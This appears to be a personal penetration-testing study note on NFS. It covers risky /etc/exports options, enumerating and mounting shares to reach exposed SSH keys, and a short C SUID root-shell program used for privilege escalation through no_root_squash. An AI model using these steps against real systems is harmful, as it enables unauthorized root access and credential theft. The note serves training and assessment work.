Port: 111 & 2049
Script: `nfs*`
Config file: `/etc/exports`

> NFS has no authentication and authorization. [[RPC]] handles it.

Server translates client's user info into File System's format.
Configuration file is at /etc/exports

### Dangerous Settings

| **Option**       | **Description**                                                                                                      |
| ---------------- | -------------------------------------------------------------------------------------------------------------------- |
| `rw`             | Read and write permissions.                                                                                          |
| `insecure`       | Ports above 1024 will be used.                                                                                       |
| `nohide`         | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| `no_root_squash` | All files created by root are kept with the UID/GID 0.                                                               |
### Basic Usage

```bash
$ showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

```bash
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share

2 directories, 3 files

ls -n target-NFS/mnt/nfs/
```


# Possible Privesc.
Create simple shell binary locally on remote system. Mount it to your attacking machine and set SUID on it. Now execute it on remote system with SUID to get root shell.

```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```
